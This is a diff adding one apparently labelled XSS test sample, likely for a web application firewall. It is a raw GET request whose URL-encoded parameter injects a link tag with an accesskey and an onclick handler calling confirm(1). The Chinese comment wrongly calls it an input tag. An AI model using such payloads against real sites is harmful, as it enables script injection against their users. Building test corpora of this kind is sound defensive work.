@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_常规_标签属性_link标签_onclick事件-06506705
+# 攻击载荷利用了HTML中的input标签和onclick属性，触发confirm()函数，显示一个提示框。"rel=canonical" 表示该链接是原始链接，即该网页的唯一可访问版本。accesskey 属性为 "X" 则是为了设置访问键，当用户按下 "X" 键时，会触发链接的点击事件。
+GET /?id=%3Clink%20rel=%22canonical%22%20accesskey=%22X%22%20onclick=%22confirm%281%29%22%20%2F%3E%20&bid=hd_tag_m8mv25hm HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25hm
+RM-PRO-Token: a13b4e5aeacc2af6b2fd27860032239b
+RM-PRO-Time: 1742808469249
+User-Agent: curl/7.83.1
+
